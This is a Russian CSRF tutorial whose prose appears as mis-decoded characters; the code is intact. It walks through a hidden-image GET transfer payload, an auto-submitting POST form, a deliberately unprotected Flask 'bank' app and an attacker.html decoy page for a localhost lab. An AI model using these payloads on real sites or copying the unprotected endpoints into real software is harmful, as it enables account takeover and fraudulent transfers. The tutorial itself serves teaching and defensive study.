
## üî• –ß—Ç–æ –¥–µ–ª–∞–µ—Ç –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –ø—Ä–∏ –∞—Ç–∞–∫–µ CSRF?

### üìå –¶–µ–ª—å:

–í—ã–ø–æ–ª–Ω–∏—Ç—å **–ª–µ–≥–∞–ª—å–Ω—ã–π –∑–∞–ø—Ä–æ—Å –æ—Ç –∏–º–µ–Ω–∏ –∂–µ—Ä—Ç–≤—ã** (–Ω–∞–ø—Ä–∏–º–µ—Ä, –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ –¥–µ–Ω—å–≥–∏, –∏–∑–º–µ–Ω–∏—Ç—å email, —É–¥–∞–ª–∏—Ç—å –ø—Ä–æ—Ñ–∏–ª—å), –∏—Å–ø–æ–ª—å–∑—É—è **–∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º—É—é –∫—É–∫—É** –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ (`sessionid`).

---

## üîß –£—Å–ª–æ–≤–∏—è –∞—Ç–∞–∫–∏:

1. –£—è–∑–≤–∏–º—ã–π —Å–∞–π—Ç **–∏—Å–ø–æ–ª—å–∑—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é —á–µ—Ä–µ–∑ –∫—É–∫–∏** (–Ω–∞–ø—Ä–∏–º–µ—Ä, Flask –∏–ª–∏ Django).
2. **–ù–µ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏**, —á—Ç–æ –∑–∞–ø—Ä–æ—Å –ø—Ä–∏—à—ë–ª –∏–º–µ–Ω–Ω–æ –æ—Ç ¬´—Ä–æ–¥–Ω–æ–≥–æ¬ª —Å–∞–π—Ç–∞ (–æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç CSRF-—Ç–æ–∫–µ–Ω, –∑–∞–≥–æ–ª–æ–≤–æ–∫ Origin –Ω–µ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è).
3. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–∂–µ **–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω –≤ —É—è–∑–≤–∏–º–æ–º —Å–∞–π—Ç–µ** (–≤ –±—Ä–∞—É–∑–µ—Ä–µ –µ—Å—Ç—å –∫—É–∫–∞).

---

## üé≠ –°—Ü–µ–Ω–∞—Ä–∏–π –∞—Ç–∞–∫–∏: –ø—Ä–æ—Å—Ç–æ–π –ø—Ä–∏–º–µ—Ä

–î–æ–ø—É—Å—Ç–∏–º, –µ—Å—Ç—å —Å–∞–π—Ç –±–∞–Ω–∫–∞ `https://mybank.com`, –∏ —É –Ω–µ–≥–æ –µ—Å—Ç—å **GET-–∑–∞–ø—Ä–æ—Å**:

```
https://mybank.com/transfer?to=hacker&amount=10000
```

–ë–∞–Ω–∫ –ø—Ä–∏–Ω–∏–º–∞–µ—Ç —Ç–∞–∫–∏–µ –∑–∞–ø—Ä–æ—Å—ã **–±–µ–∑ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ç–æ–∫–µ–Ω–∞**.

---

### üí• –ß—Ç–æ –¥–µ–ª–∞–µ—Ç –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫:

–û–Ω —Ä–∞–∑–º–µ—â–∞–µ—Ç –Ω–∞ **—Å–≤–æ—ë–º —Å–∞–π—Ç–µ** (–Ω–∞–ø—Ä–∏–º–µ—Ä, `hacker-site.com`) —Å–ª–µ–¥—É—é—â–∏–π –∫–æ–¥:

```html
<html>
  <body>
    <h1>–ü–æ–¥–∞—Ä–∫–∏ —Ç—É—Ç!</h1>
    <img src="https://mybank.com/transfer?to=hacker&amount=10000" style="display:none;">
  </body>
</html>
```

üìå **–ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç:**

- –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, —É–∂–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–π –Ω–∞ `mybank.com`, –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç `hacker-site.com`.
- **–ë—Ä–∞—É–∑–µ—Ä –≤–∏–¥–∏—Ç —Ç–µ–≥ `<img>` –∏ –¥–µ–ª–∞–µ—Ç –∑–∞–ø—Ä–æ—Å** –Ω–∞ `https://mybank.com/...`.
- –ö—É–∫–∞ —Å–µ—Å—Å–∏–∏ (`sessionid=abc123`) **–∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–∏–∫—Ä–µ–ø–ª—è–µ—Ç—Å—è** –∫ –∑–∞–ø—Ä–æ—Å—É –±—Ä–∞—É–∑–µ—Ä–æ–º.
- –°–µ—Ä–≤–µ—Ä –¥—É–º–∞–µ—Ç, —á—Ç–æ —ç—Ç–æ –¥–µ–π—Å—Ç–≤–∏–µ —Å–∞–º–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è ‚Äî –∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç –ø–µ—Ä–µ–≤–æ–¥.
    

---

## üîÑ –í–∞—Ä–∏–∞–Ω—Ç —Å `POST` (—á–µ—Ä–µ–∑ `form` –∏ `JavaScript`)

```html
<form action="https://mybank.com/change-email" method="POST" id="csrfForm">
  <input type="hidden" name="email" value="hacker@mail.com">
</form>

<script>
  document.getElementById("csrfForm").submit();
</script>
```

- –¢–∞–∫–æ–π –∫–æ–¥ –º–æ–∂–Ω–æ –≤–Ω–µ–¥—Ä–∏—Ç—å –≤ `<iframe>` –∏–ª–∏ —Å–∫—Ä—ã—Ç—ã–π `<div>`, –∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∏—á–µ–≥–æ –Ω–µ –∑–∞–º–µ—Ç–∏—Ç.
- –ë—Ä–∞—É–∑–µ—Ä –æ—Ç–ø—Ä–∞–≤–∏—Ç `POST`-–∑–∞–ø—Ä–æ—Å —Å –∫—É–∫–æ–π ‚Üí —Å–µ—Ä–≤–µ—Ä –ø—Ä–∏–º–µ—Ç, –ø–æ–¥—É–º–∞–µ—Ç, —á—Ç–æ —ç—Ç–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å.

---

## üß† –ü–æ—á–µ–º—É —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç?

–ü–æ—Ç–æ–º—É —á—Ç–æ:

- **–ö—É–∫–∞ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏** –±—Ä–∞—É–∑–µ—Ä–æ–º –∫ –¥–æ–º–µ–Ω—É `mybank.com`.
- –°–µ—Ä–≤–µ—Ä **–Ω–µ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –∏—Å—Ç–æ—á–Ω–∏–∫** (–æ—Ç–∫—É–¥–∞ –ø—Ä–∏—à—ë–ª –∑–∞–ø—Ä–æ—Å).
- –ù–µ—Ç CSRF-–∑–∞—â–∏—Ç—ã (–Ω–∞–ø—Ä–∏–º–µ—Ä, —Ç–æ–∫–µ–Ω–∞ –∏–ª–∏ —Ñ–ª–∞–≥–∞ SameSite).

---

## üìå –ß—Ç–æ –º–æ–∂–Ω–æ –∞—Ç–∞–∫–æ–≤–∞—Ç—å?

- –ü–µ—Ä–µ–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤
- –°–º–µ–Ω–∞ email –∏–ª–∏ –ø–∞—Ä–æ–ª—è
- –£–¥–∞–ª–µ–Ω–∏–µ –∞–∫–∫–∞—É–Ω—Ç–∞
- –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏–π, –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–µ–≤
- –ü—É–±–ª–∏–∫–∞—Ü–∏—è –Ω–∞ —Ñ–æ—Ä—É–º–∞—Ö –æ—Ç –∏–º–µ–Ω–∏ –∂–µ—Ä—Ç–≤—ã


1. –£—è–∑–≤–∏–º—ã–π —Å–∞–π—Ç (`bank-app`) ‚Äî –ø—Ä–æ—Å—Ç–æ–π Flask-—Å–µ—Ä–≤–µ—Ä —Å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–µ–π —á–µ—Ä–µ–∑ –∫—É–∫–∏.
2. –°–∞–π—Ç –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞ (`attacker-site`) ‚Äî –æ–±—ã—á–Ω—ã–π HTML-—Ñ–∞–π–ª —Å CSRF-–∞—Ç–∞–∫–æ–π.
   
---

## üõ† 1. –£—è–∑–≤–∏–º—ã–π —Å–∞–π—Ç (Flask)

–°–æ—Ö—Ä–∞–Ω–∏ —ç—Ç–æ –≤ `bank_app.py` –∏ –∑–∞–ø—É—Å—Ç–∏.

```python
from flask import Flask, request, make_response, redirect

app = Flask(__name__)

# "–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö" –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
user_data = {"username": "Alice", "balance": 1000, "email": "alice@example.com"}

@app.route("/")
def index():
    session_id = request.cookies.get("sessionid")
    if session_id == "abc123":
        return f"""
        <h1>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, {user_data['username']}!</h1>
        <p>–ë–∞–ª–∞–Ω—Å: ${user_data['balance']}</p>
        <p>Email: {user_data['email']}</p>
        <a href='/change-email-form'>–ò–∑–º–µ–Ω–∏—Ç—å email</a>
        """
    else:
        resp = make_response("<p>–í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω</p><a href='/'>–ü–µ—Ä–µ–π—Ç–∏ –Ω–∞ –≥–ª–∞–≤–Ω—É—é</a>")
        resp.set_cookie("sessionid", "abc123")
        return resp

@app.route("/change-email", methods=["POST"])
def change_email():
    email = request.form.get("email")
    user_data["email"] = email
    return f"Email –∏–∑–º–µ–Ω—ë–Ω –Ω–∞: {email}"

@app.route("/change-email-form")
def form():
    return """
    <form method="POST" action="/change-email">
        <input name="email" value="alice@example.com">
        <button>–ò–∑–º–µ–Ω–∏—Ç—å</button>
    </form>
    """
```

üìå **–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç:**

- –ü—Ä–∏ –ø–µ—Ä–≤–æ–º –∑–∞—Ö–æ–¥–µ –Ω–∞ `/` —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –∫—É–∫–∞ `sessionid=abc123`.
- –ú–æ–∂–Ω–æ –∏–∑–º–µ–Ω–∏—Ç—å email —á–µ—Ä–µ–∑ —Ñ–æ—Ä–º—É (`/change-email`).
- **–ù–µ—Ç –∑–∞—â–∏—Ç—ã –æ—Ç CSRF.**

---

## üí£ 2. –°–∞–π—Ç –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞ (`attacker.html`)

–°–æ–∑–¥–∞–π —Ñ–∞–π–ª `attacker.html`:

```html
<!DOCTYPE html>
<html>
  <head><title>–°—é—Ä–ø—Ä–∏–∑!</title></head>
  <body>
    <h1>–°–µ–∫—Ä–µ—Ç–Ω—ã–π –ø–æ–¥–∞—Ä–æ–∫! –ü—Ä–æ—Å—Ç–æ –ø–æ–¥–æ–∂–¥–∏‚Ä¶</h1>

    <form action="http://localhost:5000/change-email" method="POST" id="csrfForm">
      <input type="hidden" name="email" value="hacker@evil.com">
    </form>

    <script>
      document.getElementById("csrfForm").submit();
    </script>
  </body>
</html>
```

üìå –≠—Ç–æ –∏–º–∏—Ç–∏—Ä—É–µ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π —Å–∞–π—Ç, –æ—Ç–ø—Ä–∞–≤–ª—è—é—â–∏–π `POST`-–∑–∞–ø—Ä–æ—Å –Ω–∞ –±–∞–Ω–∫.

---

## üß™ –ö–∞–∫ –ø—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å:

1. –ó–∞–ø—É—Å—Ç–∏ Flask-—Å–µ—Ä–≤–µ—Ä:
    ```bash
    python bank_app.py
    ```
2. –ü–µ—Ä–µ–π–¥–∏ –≤ –±—Ä–∞—É–∑–µ—Ä–µ –Ω–∞ [http://localhost:5000/](http://localhost:5000/)  
    ‚Äî —ç—Ç–æ "–±–∞–Ω–∫", –∏ —Ç—ã –∑–∞–ª–æ–≥–∏–Ω–∏—à—å—Å—è (–∫—É–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏).
3. –û—Ç–∫—Ä–æ–π `attacker.html` **–≤ —ç—Ç–æ–º –∂–µ –±—Ä–∞—É–∑–µ—Ä–µ** (–¥–≤–æ–π–Ω–æ–π –∫–ª–∏–∫, –æ—Ç–∫—Ä–æ–µ—Ç—Å—è –∫–∞–∫ —Ñ–∞–π–ª).
4. –ß–µ—Ä–µ–∑ —Å–µ–∫—É–Ω–¥—É –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –∑–∞–ø—Ä–æ—Å, –∏ email –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑–º–µ–Ω–∏—Ç—Å—è –Ω–∞ `hacker@evil.com`.
5. –ü–µ—Ä–µ–π–¥–∏ —Å–Ω–æ–≤–∞ –Ω–∞ [http://localhost:5000/](http://localhost:5000/)  
    ‚Äî —É–≤–∏–¥–∏—à—å, —á—Ç–æ email –∏–∑–º–µ–Ω–∏–ª—Å—è, **—Ö–æ—Ç—è —Ç—ã –Ω–µ –¥–µ–ª–∞–ª —ç—Ç–æ–≥–æ –≤—Ä—É—á–Ω—É—é**.

---

## üß† –ß—Ç–æ —ç—Ç–æ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç?

- –ë—Ä–∞—É–∑–µ—Ä **–∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Ç–ø—Ä–∞–≤–∏–ª –∫—É–∫—É `sessionid`**, —Ö–æ—Ç—è —Ç—ã –±—ã–ª –Ω–∞ –¥—Ä—É–≥–æ–º —Å–∞–π—Ç–µ.
- **–ó–∞–ø—Ä–æ—Å –±—ã–ª –ø—Ä–∏–Ω—è—Ç —Å–µ—Ä–≤–µ—Ä–æ–º** ‚Äî –≤–µ–¥—å —É –Ω–µ–≥–æ –Ω–µ—Ç –∑–∞—â–∏—Ç—ã.
- **Email –±—ã–ª –∏–∑–º–µ–Ω—ë–Ω –±–µ–∑ –≤–µ–¥–æ–º–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.**
